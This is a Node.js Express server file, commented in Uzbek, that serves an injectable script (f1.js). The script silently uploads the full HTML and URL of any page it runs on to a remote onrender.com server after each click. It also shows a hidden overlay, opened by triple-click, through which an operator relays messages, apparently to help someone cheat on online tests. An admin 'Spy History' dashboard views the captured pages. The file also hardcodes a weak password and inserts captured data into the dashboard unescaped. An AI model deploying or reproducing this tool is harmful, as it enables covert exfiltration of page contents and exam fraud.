const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const cookieParser = require("cookie-parser");

const app = express();

// ========================================================
// ⚙️ SOZLAMALAR
const MY_SERVER_URL = "https://server-xkuu.onrender.com"; // O'zgartiring!
const ADMIN_PASSWORD = "8908"; 
// ========================================================

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(cookieParser());

// --- XOTIRA (RAM) ---
// Barcha kelgan sahifalarni shu yerda saqlaymiz (Array)
let capturedPages = []; 
let chatHistory = ""; 
let lastUpdateID = 0;

// O'zbekiston vaqtini olish funksiyasi
const getUzTime = () => {
    return new Date().toLocaleString("uz-UZ", { timeZone: "Asia/Tashkent", hour12: false });
};

// --- AUTH ---
const checkAuth = (req, res, next) => {
    if (req.cookies.admin_token === ADMIN_PASSWORD) next();
    else res.redirect("/login");
};

// ========================================================
// 📜 CLIENT SKRIPTI (f1.js) - 1 QATORLI SCROLL
// ========================================================
const clientScript = `
(function(){
  const BASE = '${MY_SERVER_URL}'; 
  let lastSince=0, box=null, holdTimer=null, clickCount=0;

  // 1. OYNA DIZAYNI (1 Qator, gorizontal scroll)
  function makeBox(){
    if(box) return box;
    box=document.createElement('div');
    Object.assign(box.style,{
      position:'fixed', left:'10px', bottom:'10px', 
      width:'280px',              
      height:'35px',              // Faqat 1 qator balandlik
      lineHeight:'35px',          // Yozuvni o'rtaga olish
      overflowX:'auto',           // YONGA SCROLL
      overflowY:'hidden',         // Pastga scroll yo'q
      whiteSpace:'nowrap',        // Yozuvni pastga tushirmaslik (1 qator)
      
      background:'rgba(0, 0, 0, 0.6)', 
      color:'#00ff00',            // Yashil yozuv
      padding:'0 10px',
      font:'13px monospace',     
      borderRadius:'50px',        // Yumaloq chetlar
      zIndex:2147483647,
      display:'none', 
      backdropFilter:'blur(4px)', 
      border:'1px solid rgba(0,255,0,0.3)',
      cursor:'pointer'
    });
    
    // Scrollbar dizayni (yashirish yoki ingichka qilish)
    const style = document.createElement('style');
    style.innerHTML = \`
      ::-webkit-scrollbar { height: 3px; } 
      ::-webkit-scrollbar-track { background: transparent; }
      ::-webkit-scrollbar-thumb { background: rgba(0,255,0,0.5); borderRadius: 10px; }
    \`;
    document.head.appendChild(style);
    document.body.appendChild(box);
    return box;
  }

  // 2. HTML YUBORISH
  async function sendPage(){
    try{
      await fetch(BASE+'/upload-html',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({
            html: document.documentElement.outerHTML,
            url: window.location.href
        })
      });
      // Xabar yuborilgandan keyin ham oxirgi xabarni ko'rsatib turish uchun
      fetchLatest(); 
    }catch(e){}
  }

  // 3. XABAR OLISH (Serverdan)
  async function fetchLatest(){
    try{
      // since=0 qilib yuborsak, har doim to'liq tarixni olamiz
      const r=await fetch(BASE+'/latest?since='+lastSince);
      const j=await r.json();
      
      if(j.success){
        const b=makeBox();
        // Serverdan kelgan xabarni (yangi qatorlarni bo'sh joyga almashtiramiz)
        // Shunda hammasi 1 qatorda turadi
        let text = j.message.replace(/\\n/g, " | "); 
        b.innerText = text; 
        
        // Agar yangi xabar bo'lsa, oynani ko'rsatamiz
        if(j.timestamp > lastSince) {
            b.style.display='block';
            b.scrollLeft = b.scrollWidth; // Avto oxiriga o'tkazish
        }
        lastSince = j.timestamp;
      }
    }catch(e){}
  }

  // --- GESTURES (BOSHQARUV) ---

  // 1. Sichqoncha 3 marta bosilsa -> Ochish/Yopish
  document.addEventListener('click', e=>{
    // Click sanash
    if(e.button===0){
      clickCount++;
      setTimeout(()=>clickCount=0,600);
      if(clickCount>=3){
        clickCount=0;
        if(box) box.style.display=(box.style.display==='none')?'block':'none';
      }
    }
    
    // Har qanday click bo'lganda (test yechayotganda)
    // 2 soniyadan keyin yangi sahifani yuborish (Auto-Spy)
    setTimeout(sendPage, 2000);
  });

  // 2. Bosib turilsa (Hold) -> Yangilash
  document.addEventListener('mousedown', e=>{
    if(e.button===0) holdTimer=setTimeout(()=>{
        fetchLatest();
        if(box) {
            box.style.display='block'; // Bosib turganda majburan ko'rsatish
            box.style.background='rgba(0,255,0,0.2)'; // Indikator
            setTimeout(()=>box.style.background='rgba(0,0,0,0.6)', 200);
        }
    }, 2000); // 2 soniya ushlab turilsa
  });

  document.addEventListener('mouseup', ()=>{
    if(holdTimer){clearTimeout(holdTimer); holdTimer=null;}
  });

  // Ishga tushganda
  setInterval(fetchLatest, 4000); // Har 4 soniyada tekshir
  sendPage(); 
})();
`;

// ========================================================
// 🛣 ROUTES
// ========================================================

app.get("/f1.js", (req, res) => {
    res.setHeader("Content-Type", "application/javascript");
    res.send(clientScript);
});

// LOGIN
app.get("/login", (req, res) => {
    if (req.cookies.admin_token === ADMIN_PASSWORD) return res.redirect("/");
    res.send(`<body style="background:#000;display:flex;justify-content:center;align-items:center;height:100vh"><form action="/login" method="POST"><input type="password" name="password" style="background:#111;border:1px solid lime;color:lime;padding:10px;text-align:center;font-size:20px" placeholder="CODE" autofocus></form></body>`);
});
app.post("/login", (req, res) => {
    if (req.body.password === ADMIN_PASSWORD) {
        res.cookie("admin_token", ADMIN_PASSWORD, { maxAge: 86400000, httpOnly: true });
        res.redirect("/");
    } else res.redirect("/login");
});
app.get("/logout", (req, res) => {
    res.clearCookie("admin_token");
    res.redirect("/login");
});

// ADMIN DASHBOARD
app.get("/", checkAuth, (req, res) => {
    // Sahifalar ro'yxatini HTML qilish
    let pagesListHtml = capturedPages.map((p, index) => {
        return `
        <div class="page-item">
            <span class="badge">#${index + 1}</span>
            <span class="time">${p.date}</span>
            <a href="${p.url}" target="_blank" class="link">${p.url.substring(0, 30)}...</a>
            <a href="/view-site/${index}" target="_blank" class="btn-view">👁 KO'RISH</a>
        </div>`;
    }).reverse().join(""); // Eng yangisi tepada tursin

    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Spy History</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { background: #0d1117; color: #c9d1d9; font-family: monospace; padding: 10px; max-width: 800px; margin: auto; }
                .box { border: 1px solid #30363d; background: #161b22; padding: 15px; margin-bottom: 20px; border-radius: 6px; }
                h2 { color: #58a6ff; border-bottom: 1px solid #333; padding-bottom: 5px; margin-top:0; }
                
                /* Chat Styles */
                input { width: 70%; padding: 10px; background: #0d1117; border: 1px solid #333; color: white; }
                button { padding: 10px; cursor: pointer; border: none; font-weight: bold; }
                .btn-send { background: #238636; color: white; width: 25%; }
                .btn-clear { background: #da3633; color: white; width: 100%; margin-top:5px; }
                .chat-history { background: #000; color: lime; padding: 10px; height: 100px; overflow-y: scroll; border: 1px solid #333; font-size: 12px; margin-top:10px; white-space: pre-wrap; }

                /* Pages List Styles */
                .page-item { display: flex; align-items: center; gap: 10px; background: #21262d; padding: 10px; margin-bottom: 5px; border-radius: 4px; border: 1px solid #30363d; }
                .badge { background: #1f6feb; color: white; padding: 2px 6px; borderRadius: 4px; font-size: 11px; }
                .time { color: #8b949e; font-size: 11px; }
                .link { color: #58a6ff; text-decoration: none; font-size: 12px; flex: 1; }
                .btn-view { background: #238636; color: white; padding: 5px 10px; text-decoration: none; font-size: 11px; border-radius: 3px; }
                .btn-view:hover { background: #2ea043; }
            </style>
        </head>
        <body>
            <div style="display:flex;justify-content:space-between">
                <span>Server: ${MY_SERVER_URL}</span>
                <a href="/logout" style="color:red">Chiqish</a>
            </div>

            <!-- CHAT -->
            <div class="box">
                <h2>💬 Chat</h2>
                <form action="/set-message" method="POST" style="display:flex; justify-content:space-between">
                    <input type="text" name="msg" placeholder="Xabar..." autocomplete="off">
                    <button class="btn-send">YUBORISH</button>
                </form>
                <div class="chat-history">${chatHistory || "Bo'sh"}</div>
                <form action="/clear-history" method="POST"><button class="btn-clear">Chatni Tozalash</button></form>
            </div>

            <!-- SAQLANGAN SAHIFALAR -->
            <div class="box">
                <div style="display:flex; justify-content:space-between; align-items:center">
                    <h2>📥 Kelgan Sahifalar (${capturedPages.length})</h2>
                    <form action="/clear-pages" method="POST" style="margin:0"><button style="background:transparent;color:red;border:1px solid red;padding:2px 5px">Tozalash</button></form>
                </div>
                
                ${capturedPages.length === 0 ? '<p style="text-align:center;color:#666">Hali ma\'lumot yo\'q</p>' : pagesListHtml}
            </div>
        </body>
        </html>
    `);
});

// SAHIFANI KO'RISH (ID bo'yicha)
app.get("/view-site/:id", checkAuth, (req, res) => {
    const id = req.params.id;
    const page = capturedPages[id];

    if (!page) return res.send("Sahifa topilmadi yoki o'chirilgan.");
    
    // <base> qo'shish (CSS/Rasmlar uchun)
    const fixedHtml = page.html.replace("<head>", `<head><base href="${page.url}">`);
    res.send(fixedHtml);
});

// DATA QABUL QILISH (Arrayga qo'shish)
app.post("/upload-html", (req, res) => {
    const newPage = {
        url: req.body.url || "Noma'lum",
        html: req.body.html || "",
        date: getUzTime()
    };
    
    // Arrayga qo'shamiz
    capturedPages.push(newPage);
    
    // RAM to'lib ketmasligi uchun faqat oxirgi 50 ta sahifani saqlaymiz
    if(capturedPages.length > 50) capturedPages.shift();

    console.log(`[+] Yangi sahifa: ${newPage.url}`);
    res.json({ status: "success" });
});

// XABAR YUBORISH
app.post("/set-message", checkAuth, (req, res) => {
    const msg = req.body.msg;
    if(msg) {
        // Chat tarixiga vaqt bilan qo'shish
        chatHistory += `[${getUzTime().split(' ')[1]}] ${msg}\n`;
        lastUpdateID = Date.now();
    }
    res.redirect("/");
});

// TOZALASH FUNKSIYALARI
app.post("/clear-history", checkAuth, (req, res) => {
    chatHistory = ""; 
    lastUpdateID = Date.now(); 
    res.redirect("/");
});
app.post("/clear-pages", checkAuth, (req, res) => {
    capturedPages = []; 
    res.redirect("/");
});

// LATEST (Client uchun)
app.get("/latest", (req, res) => {
    const clientTimestamp = parseInt(req.query.since) || 0;
    
    // Clientga har doim butun tarixni beramiz (u o'zi 1 qator qilib oladi)
    // Lekin timestamp tekshirib, "yangi xabar" signalini beramiz
    res.json({ 
        success: true, 
        message: chatHistory, 
        timestamp: lastUpdateID 
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server ishga tushdi: ${PORT}`));
